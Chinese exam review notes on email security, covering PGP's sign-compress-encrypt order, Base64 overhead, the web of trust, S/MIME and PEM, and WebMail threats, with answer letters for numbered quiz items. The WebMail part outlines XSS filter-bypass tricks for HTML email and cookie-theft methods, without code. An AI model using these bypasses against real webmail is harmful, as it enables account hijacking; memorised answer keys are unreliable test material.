・密钥分发：如果只用对称算法，又会遇到"这把对称密钥怎么安全地送给对方"的老问题。PGP 的解法是把两者组合起来——课本原话：「PGP 用公开密码算法对会话密钥 Ks 进行加密（使用接收方的公钥 PUB），然后用对称密码算法对压缩后的报文进行加密（使用会话密钥 Ks）。这种链式加密方法（也称为"数字信封"）既有公开密码体系的保密性，又有对称密码体系的高效性，从而既保证了邮件正文的机密性，又安全地传递了对称密码算法的密钥。」p.312
・附加好处：会话密钥是发送方随机产生的，不需要和接收方协商密钥，且只用一次，即使偶然被泄露，也不会影响到下次邮件的发送过程。
一句话总结：用公钥体制解决"密钥怎么送"，用对称体制解决"数据怎么快速加密"，各取所长。
12.PGP 为什么要对加密后的报文进行 Base64 编码？并分析编码对传输性能的影响。
答p.313
（一）为什么要编码：出于邮件兼容性的考虑。
经过压缩和对称加密之后得到的报文是任意的二进制数据，而很多文件系统（邮件系统）只允许使用 ASCII 字符组成的报文，二进制数据中的某些字节在这些系统中是非法的或有特殊含义，可能被截断或改写。因此 PGP 使用 Base64 编码（表 10-2 中称为 Radix 64，也就是 MIME 的 Base64 编码）将报文转换成 ASCII 字符串，从而使邮件应用安全透明——不管中间经过什么邮件系统，报文都能原样通过。
（二）对传输性能的影响：
① 数据量膨胀 33%：「使用 Base64 编码转换后将导致消息大小增加 33%（每 3 字节的二进制数据映射成 4 个 ASCII 字符）」。（4 ÷ 3 − 1 ≈ 33%。）膨胀意味着传输时间变长、占用存储与带宽增加。
② 但实际影响远小于 33%：「由于加密前对消息进行了压缩，因此实际的性能下降幅度要小很多。」——PGP 的处理顺序是先压缩再加密再编码，压缩已经把报文缩小了一大截，Base64 再放大 1/3，两者相抵，最终报文通常仍比原始邮件小或相差不大。
③ 另外还有编解码本身的少量 CPU 开销，但 Base64 是简单的查表映射，代价可忽略。
结论：Base64 是用约 33% 的体积代价换取"能在所有邮件系统里通过"的兼容性，而先压缩的设计正好把这个代价对冲掉了大部分。

  • 种子：12 字符 × 8 = 96 比特 + 日期/时间 32 比特 = 128 比特；分成 2 个 64 位明文块
  • Key ID = 公钥的低 64 位（264 重复概率极小）
  • 口令短语 → SHA-1 → 160 比特 → 作 CAST-128 密钥加密私钥
  • Base64 膨胀 33%（3 字节 → 4 字符）
  • 分段阈值：报文最大长约 50 000 字节
  • 禁用账户一般 5～10 分钟

机密性 · 完整性 · 不可否认性 · 真实性

PGP 只作用于邮件正文，所以不管可用性 → 单选 3 = A；也建不了 VPN 隧道 → 单选 15 = C

→ 单选 8「网络层」= D. IPSec

⑥ 三种标准，一句话区分

  • PEM：在 MIME 之前提出 → 不支持 MIME，只支持文本；依赖 PKI 和 X.509 → 没普及
  • S/MIME：层次化 CA、树状信任 → 适合有层级的组织；已内置于客户端和浏览器
  • PGP：信任网 Web of Trust、以用户为中心 → 适合个人；缺严格撤销机制

三者互不兼容，无法互操作。→ 单选 2 = D（HTTP 不是安全邮件方案）

⑦ 信任网三个字段

拥有者可信性用户自己指定：不信任/部分信任/一直信任/绝对信任
签名可信性PGP 抄自签名者的拥有者可信性；签名者不在公钥环里则记不信任
密钥合法性PGP 算出来：合法 / 不合法

合法性算法：有一个绝对信任 → 直接合法；否则一直信任记 1/X，部分信任记 1/Y，加权和 ≥ 1 即合法。
课本例 X=1,Y=2：1 个"一直"或 2 个"部分"即合法。孤立用户（无信任者签名）不合法。

→ 单选 7 = A、11 = A、12 = B；简答 5

⑧ WebMail 三大威胁

  1. 暴力破解 → 防：禁用账户（可被利用成 DoS）／禁止 IP（误伤共用 IP、代理可绕）／登录检验（验证码要放图片里且文件名随机）。最终靠密码策略
  2. 恶意 HTML 邮件 → 改密码表单欺骗（防：要求输入旧密码）；恶性脚本；绕过过滤 4 法：事件属性 / URI scheme 设 javascript / SGML 字符引用转十六进制（元素和属性不可用字符引用）/ 样式表 @import；引入外部页 3 法：refresh / iframe / scriptlet。POP3 服务器上不过滤
  3. Cookie 会话攻击 → 获取靠内网监听 + XSS；持久型 Cookie 复制文件即可用，临时 Cookie 要靠 Achilles（HTTP 代理）。防：系统避免持久型 Cookie；用户设 Cookie 安全级别 / Cookie 管理工具 / 打补丁

→ 简答 6

类别看什么含哪些方法

⑪ 协议选择题速判

  • 客户端操作要同步到服务器 → IMAP（POP3 是脱机）→ 单选 1 = C
  • 抓包能看到口令 → 走的是 HTTP；看不到 → HTTPS → 单选 13 = A
  • 不用公钥分发会话密钥 的是 Needham-Schroeder（靠 KDC + 对称主密钥）→ 单选 14 = B
  • 会话密钥安全交换 = 数字信封 → 单选 5 = A
  • PGP 不用来加密会话（正文）的算法 = RSA → 单选 10 = C

⑫ 三道 PPT 讨论题（老师点过题）

  • 顺序：先签名→再压缩→最后加密（理由各两条，见①）
  • Base64：密文是二进制，很多系统只收 ASCII；代价膨胀 33%，但加密前已压缩，实际下降小很多
  • 分段：邮件系统限最大报文长（约 50 000 字节）；分段在所有处理（含 Base64）之后才做，所以会话密钥部分和签名部分只在第 1 个报文段的开始位置出现一次；接收端须剥掉所有邮件首部才能重装
最后：如果只剩五分钟，就看这五句
  1. 邮件不安全的根子是：SMTP/POP3/IMAP 明文传输、明文存储、发信不认证。
  2. PGP 的顺序是先签名、再压缩、最后加密，然后 Base64，最后才分段。
  3. PGP 里公钥运算只有两处：私钥签散列值、对方公钥加密会话密钥（数字信封）；正文一律对称加密。
  4. PGP 的信任模型是以用户为中心的信任网，只有拥有者可信性由用户手工指定，合法性靠加权和 ≥ 1。
  5. WebMail 三威胁：暴力破解 / 恶意 HTML 邮件 / Cookie 会话攻击；反垃圾三分法：地址 / 内容 / 行为。
